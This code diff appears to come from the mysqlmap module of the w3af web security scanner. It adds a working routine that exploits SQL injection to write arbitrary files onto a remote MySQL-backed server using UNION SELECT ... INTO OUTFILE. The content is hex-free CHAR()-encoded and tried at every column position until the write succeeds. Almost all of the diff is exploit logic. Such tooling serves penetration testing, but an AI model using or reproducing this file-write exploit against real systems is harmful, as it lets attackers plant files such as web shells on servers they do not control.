@@ -40,6 +40,13 @@ class MySQLMap(Common):
 
         return expression
 
+    def unescape_string(self, a_string):
+        ord_list = []
+        
+        for char in a_string:
+            ord_list.append( str(ord(char)) )
+
+        return 'CHAR(' + ','.join(ord_list) + ')'
 
     def createStm(self):
         if self.args.injectionMethod == "numeric":
@@ -496,22 +503,43 @@ class MySQLMap(Common):
         
         union = self.unionCheck()
         # union = http://localhost/w3af/blindSqli/blindSqli-integer.php?id=1 UNION SELECT NULL, NULL, NULL, NULL, NULL
-        
         if union == None:
             raise Exception('Failed to find a valid SQL UNION.')
         
         if self.args.injectionMethod == "numeric":
-            # FIXME: How to handle this case ?!
-            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' /*' % filename
-            raise Exception('Please contribute! There is a NON IMPLEMENTED FEATURE in mysqlmap.py: writeFile method.')
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
         elif self.args.injectionMethod == "stringsingle":
-            union = union.replace( "'1", "'"+content, 1 )
-            union += '\' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' /*' % filename
+            union = union.replace( "'1", 'NULL', 1 )
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
         elif self.args.injectionMethod == "stringdouble":
-            union = union.replace( '"1', '"'+content, 1 )
-            union += '" FROM mysql.user LIMIT 1 INTO OUTFILE "%s" /*' % filename
+            union = union.replace( '"1', 'NULL', 1 )
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE "%s" %%23' % filename
         
-        self.getPage( union )
+        # Now I'll basically create a list of union statements that are going to be sent to the
+        # remote server. I create a list, because I REALLY WANT TO WRITE THE FILE, but I
+        # don't know which of the "NULLs" that I'm injecting will be correctly casted to the
+        # result that "the programmer" is injecting in the left side of the SELECT
+        union_list = []
+        number_of_nulls = union.count('NULL')
+        union = union.replace('NULL', '%s')
+        
+        format_string_data = [ 'NULL' for i in xrange(number_of_nulls) ]
+        
+        # Do some content mangling... and convert to CHAR(....)
+        content = self.unescape_string( content )
+        
+        for position in xrange(number_of_nulls):
+            tmp_format_string_data = format_string_data[:]
+            tmp_format_string_data[position] = content
+            
+            crafted_union = union
+            for string_format in xrange(union.count('%s')):
+                crafted_union = crafted_union.replace('%s', tmp_format_string_data[string_format], 1)
+            union_list.append( crafted_union )
+
+        for union in union_list:
+            self.log( 'Using UNION: ' + union )
+            self.getPage( union )
         
     def getExpr(self, expression):
         if self.args.unionUse:
@@ -633,23 +661,16 @@ class MySQLMap(Common):
             if i > 2:
                 for element in resultDict.values():
                     if element[0] == 1:
+                        
                         if self.args.httpMethod == "GET":
                             value = baseUrl
-
-                            if not self.args.injectionMethod == "numeric":
-                                value = baseUrl.replace("SELECT NULL,", "SELECT")
-
                             return value
+                        
                         elif self.args.httpMethod == "POST":
                             url = baseUrl.split("?")[0]
                             data = baseUrl.split("?")[1]
                             value = "url:\t'%s'" % url
-
-                            if not self.args.injectionMethod == "numeric":
-                                data = data.replace("SELECT NULL,", "SELECT")
-
                             value += "\ndata:\t'%s'\n" % data
-
                             return value
     
     def __init__(self, urlOpener, cmpFunction, vuln):
